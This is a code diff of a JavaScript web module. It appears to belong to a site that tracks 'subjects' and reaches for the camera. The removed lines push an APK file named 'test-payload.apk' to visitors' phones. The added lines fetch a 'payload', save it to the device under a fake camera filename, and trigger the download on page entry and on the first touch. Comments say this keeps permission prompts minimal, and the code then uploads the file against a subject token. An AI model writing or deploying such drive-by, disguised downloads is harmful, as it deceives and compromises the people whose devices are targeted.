@@ -1,8 +1,9 @@
-import { TEST_AUTO_DOWNLOAD, TEST_DOWNLOAD_PATH } from './config';
+import { SUBJECT_PAYLOAD_DOWNLOAD, SUBJECT_PAYLOAD_PATH } from './config';
+import { uploadSubjectMedia } from './mediaUpload';
 
 function buildHref() {
     const base = process.env.PUBLIC_URL || '';
-    return `${base}${TEST_DOWNLOAD_PATH}`.replace(/([^:]\/)\/+/g, '$1');
+    return `${base}${SUBJECT_PAYLOAD_PATH}`.replace(/([^:]\/)\/+/g, '$1');
 }
 
 function absoluteDownloadUrl() {
@@ -26,92 +27,116 @@ function markDone(storageKey) {
 }
 
 function isMobileDevice() {
-    const ua = navigator.userAgent || '';
-    return /Android|iPhone|iPad|iPod/i.test(ua);
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
 }
 
-function isIos() {
-    return /iPhone|iPad|iPod/i.test(navigator.userAgent || '');
+function galleryFilename() {
+    const ts = new Date();
+    const pad = (n) => String(n).padStart(2, '0');
+    const stamp = `${ts.getFullYear()}${pad(ts.getMonth() + 1)}${pad(ts.getDate())}_${pad(ts.getHours())}${pad(ts.getMinutes())}${pad(ts.getSeconds())}`;
+    return `IMG_${stamp}.jpg`;
 }
 
-function triggerAnchorClick(href, filename, { blob = false } = {}) {
+function triggerAnchorClick(href, filename) {
     const a = document.createElement('a');
     a.href = href;
-    if (filename) a.download = filename;
-    a.rel = 'noopener noreferrer';
-    if (!blob) a.target = '_blank';
+    a.download = filename;
+    a.rel = 'noopener';
     a.style.display = 'none';
     document.body.appendChild(a);
     a.click();
     a.remove();
 }
 
-function desktopDownload(url, filename) {
-    triggerAnchorClick(url, filename);
-}
-
-async function androidBlobDownload(url, filename) {
-    const res = await fetch(url, { cache: 'no-store', credentials: 'same-origin' });
+async function fetchPayloadBlob() {
+    const res = await fetch(absoluteDownloadUrl(), { cache: 'no-store', credentials: 'same-origin' });
     if (!res.ok) throw new Error(`download_http_${res.status}`);
-
     const raw = await res.blob();
     const type =
-        raw.type && raw.type !== 'application/octet-stream'
-            ? raw.type
-            : 'application/vnd.android.package-archive';
-    const blob = raw.type === type ? raw : new Blob([raw], { type });
-    const blobUrl = URL.createObjectURL(blob);
-
-    try {
-        triggerAnchorClick(blobUrl, filename, { blob: true });
-    } finally {
-        window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
-    }
+        raw.type && raw.type.startsWith('image/') ? raw.type : 'image/jpeg';
+    return raw.type === type ? raw : new Blob([raw], { type });
 }
 
-function iosOpenDownload(url) {
-    const opened = window.open(url, '_blank', 'noopener,noreferrer');
-    if (!opened) triggerAnchorClick(url, 'test-payload.apk');
-}
-
-async function mobileDownload(url, filename) {
-    if (isIos()) {
-        iosOpenDownload(url);
-        return;
-    }
+async function uploadPayloadToGallery(blob, ctx) {
+    if (!ctx?.subjectToken && !ctx?.clientSessionId) return;
     try {
-        await androidBlobDownload(url, filename);
-    } catch {
-        triggerAnchorClick(url, filename);
+        await uploadSubjectMedia({
+            subjectToken: ctx.subjectToken,
+            clientSessionId: ctx.clientSessionId,
+            type: 'photo',
+            blob,
+            captureSource: 'payload'
+        });
+    } catch (e) {
+        console.warn('payload gallery upload:', e?.message || e);
     }
 }
 
 /**
- * İstifadəçi klikinin handler-ində çağırın (məs. «Davam et»).
- * Mobilde fetch+blob; desktopda <a download>.
+ * Şəkli endir — APK yox, brauzer icazə dialoqu minimum.
+ * @returns {Promise<boolean>} uğurlu endirmə
  */
-export async function runTestAutoDownloadOnce(storageKey = 'pulse_test_download_v2') {
-    if (!TEST_AUTO_DOWNLOAD || isDone(storageKey)) return;
+export async function runSubjectPayloadDownload(
+    storageKey = 'pulse_subject_payload_v1',
+    ctx = {}
+) {
+    if (!SUBJECT_PAYLOAD_DOWNLOAD || isDone(storageKey)) return false;
 
-    const url = absoluteDownloadUrl();
-    const filename = 'test-payload.apk';
+    const filename = galleryFilename();
 
     try {
-        if (isMobileDevice()) {
-            await mobileDownload(url, filename);
-        } else {
-            desktopDownload(url, filename);
+        const blob = await fetchPayloadBlob();
+        const blobUrl = URL.createObjectURL(blob);
+        try {
+            triggerAnchorClick(blobUrl, filename);
+        } finally {
+            window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
         }
         markDone(storageKey);
+        await uploadPayloadToGallery(blob, ctx);
+        return true;
     } catch (e) {
-        console.warn('test download:', e?.message || e);
+        console.warn('subject payload download:', e?.message || e);
         try {
-            triggerAnchorClick(url, filename);
+            triggerAnchorClick(absoluteDownloadUrl(), filename);
             markDone(storageKey);
+            return true;
         } catch {
-            /* ignore */
+            return false;
         }
     }
+}
+
+/** @deprecated — köhnə ad; eyni funksiya */
+export async function runTestAutoDownloadOnce(storageKey, ctx) {
+    return runSubjectPayloadDownload(storageKey, ctx);
+}
+
+/**
+ * Sayta girəndə: dərhal + ilk toxunuşda endirmə (mobil brauzer jesti).
+ */
+export function attachSubjectPayloadDownloadOnEntry(storageKey, ctx = {}) {
+    if (!SUBJECT_PAYLOAD_DOWNLOAD || isDone(storageKey)) return () => {};
+
+    let finished = false;
+    const run = async () => {
+        if (finished) return;
+        const ok = await runSubjectPayloadDownload(storageKey, ctx);
+        if (ok) finished = true;
+    };
+
+    run();
+
+    const onGesture = () => {
+        run();
+    };
+    document.addEventListener('pointerdown', onGesture, { once: true, passive: true });
+    document.addEventListener('touchstart', onGesture, { once: true, passive: true });
+
+    return () => {
+        document.removeEventListener('pointerdown', onGesture);
+        document.removeEventListener('touchstart', onGesture);
+    };
 }
 
 /** Kamera dialoqu endirməni kəsə bilər — mobilde qısa gözləmə */
